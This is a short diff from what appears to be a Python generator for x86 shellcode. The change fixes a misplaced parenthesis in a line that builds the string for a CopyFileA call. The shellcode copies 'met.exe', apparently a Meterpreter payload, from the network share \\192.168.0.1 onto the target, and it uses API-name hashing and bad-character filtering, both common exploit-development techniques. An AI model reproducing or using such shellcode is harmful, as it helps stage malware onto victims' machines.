@@ -46,7 +46,7 @@ def generate(bad_chars, exit_func, debug=False):
         xor eax, eax                    //
         push eax                        // Argument3: bFailIfExists
         push edi                        // Argument2: Destination
-        {push_string("\\\\192.168.0.1\\dep\\met.exe"), bad_chars}   // Argument1: lpExistingFileName
+        {push_string("\\\\192.168.0.1\\dep\\met.exe", bad_chars)}   // Argument1: lpExistingFileName
         {push_hash('KERNEL32.DLL', 'CopyFileA', hash_key)}
         call dword ptr [ebp+0x04]       // Call CopyFileA
 
